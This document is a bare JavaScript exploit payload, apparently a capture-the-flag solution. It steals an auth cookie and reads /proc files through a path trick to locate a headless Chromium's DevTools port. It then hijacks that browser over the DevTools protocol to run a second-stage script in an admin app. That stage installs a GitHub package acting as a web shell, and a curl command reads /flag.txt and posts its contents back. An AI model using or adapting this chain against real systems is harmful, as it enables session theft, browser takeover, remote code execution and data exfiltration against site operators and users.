(async()=>{
const post=t=>fetch('/edit',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title=csrf&content='+encodeURIComponent(String(t).replace(/[^A-Za-z0-9 !.:()]/g,' '))});
const read=async p=>{
 try{
  let r=await fetch('/profile'+p+'%3f',{cache:'no-store'});
  return [r.status,await r.text()];
 }catch(e){return [0,'']}
};
const ck=document.cookie.split(';').map(x=>x.trim()).find(x=>x.startsWith('auth='))||document.cookie.split(';')[0]||'';
const stage=`(async()=>{
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
const api=async(p,d)=>{
 let f=new FormData();
 f.append('__csrf__',document.querySelector('meta[name=csrf]').content);
 f.append('__json__',JSON.stringify(d));
 let r=await fetch(p,{method:'POST',body:f});
 let t=await r.text().catch(()=>'');
 return p+' '+r.status+' '+t.slice(0,80);
};
await sleep(1500);
if(!document.querySelector('meta[name=csrf]'))return 'csrf none '+location.href;
let a=await api('/_api/package-manager/add-repository',{platform:'github',name:'2ash1/static',repositoryUrl:'https://github.com/2Ash1/static',branch:'main'}).catch(e=>'add err '+e.name+' '+e.message);
let b=await api('/_api/package-manager/install',{package:'2ash1/static'}).catch(e=>'install err '+e.name+' '+e.message);
await sleep(2000);
let ck=decodeURIComponent(location.hash.slice(1));
let cmd='curl -s -X POST http://app/edit -H "Cookie: '+ck.replace(/"/g,'')+'" --data title=flag --data-urlencode content="$(python3 -c \\'print(open("/flag.txt","rb").read().hex())\\')"';
location.href='/packages/2ash1/static/index.php?cmd='+encodeURIComponent(cmd);
return a+' | '+b;
})()`;

const dirsFrom=c=>{
 let out=[];
 for(let x of c.matchAll(/\/tmp\/\.org\.chromium\.Chromium\.scoped_dir\.[A-Za-z0-9]+/g)){
  if(!out.includes(x[0]))out.push(x[0]);
 }
 for(let x of c.matchAll(/--user-data-dir=(.*?)(?:\.--[A-Za-z0-9-]+(?:=|\.)|$)/g)){
  let d=x[1].replace(/\.+$/,'');
  if(d&&!out.includes(d))out.push(d);
 }
 return out;
};
const wsFrom=async dir=>{
 let [st,d]=await read(dir+'/DevToolsActivePort');
 post('dtap '+st+' '+d.length+' '+d.slice(0,90));
 if(st!==200)return '';
 let port=(d.match(/\b(\d{2,6})\b/)||[])[1]||'';
 let path=(d.match(/\/devtools\/browser\/[A-Za-z0-9.-]+/)||[])[0]||'';
 if(!path){
  let id=(d.match(/(?:browser|devtools)[^A-Za-z0-9]+([A-Za-z0-9.-]{20,})/)||[])[1]||'';
  if(id)path='/devtools/browser/'+id;
 }
 if(!port||!path)return '';
 return 'ws://localhost:'+port+path;
};
const findWs=async()=>{
 for(let base=1;base<4000;base+=80){
  let res=await Promise.all(Array.from({length:80},async(_,i)=>{
   let pid=base+i;
   let [st,c]=await read('/proc/'+pid+'/cmdline');
   if(st!==200||!c.includes('user-data-dir'))return '';
   post('pid '+pid);
   let dirs=dirsFrom(c);
   for(let dir of dirs){
    post('dir '+dir);
    let ws=await wsFrom(dir);
    if(ws)return ws;
   }
   return '';
  }));
  let hit=res.find(Boolean);
  if(hit)return hit;
 }
 return '';
};
const run=wsurl=>{
 post('ws '+wsurl.replace(/[^A-Za-z0-9:]/g,' ').slice(0,120));
 let ws=new WebSocket(wsurl),id=0,wait={};
 const send=(method,params={},sid='')=>new Promise((res,rej)=>{
  let n=++id;
  wait[n]=res;
  ws.send(JSON.stringify({id:n,method,params,...(sid?{sessionId:sid}:{})}));
  setTimeout(()=>rej(new Error('timeout '+method)),8000);
 });
 ws.onerror=()=>post('ws error');
 ws.onmessage=e=>{
  let m=JSON.parse(e.data);
  if(m.id&&wait[m.id]){wait[m.id](m);delete wait[m.id]}
 };
 ws.onopen=async()=>{
  try{
   post('ws open');
   let t=await send('Target.createTarget',{url:'http://admin-app/dashboard/home#'+encodeURIComponent(ck)});
   let sid=(await send('Target.attachToTarget',{targetId:t.result.targetId,flatten:true})).result.sessionId;
   post('target attach');
   let r=await send('Runtime.evaluate',{expression:stage,awaitPromise:true,returnByValue:true},sid);
   post('eval '+String((((r.result||{}).result||{}).value)||'sent').slice(0,400));
  }catch(e){post('err '+e.name+' '+e.message)}
 };
};

post('cdp dyn 0615aa');
let wsurl=await findWs();
if(!wsurl){post('ws none');return}
run(wsurl);
})();
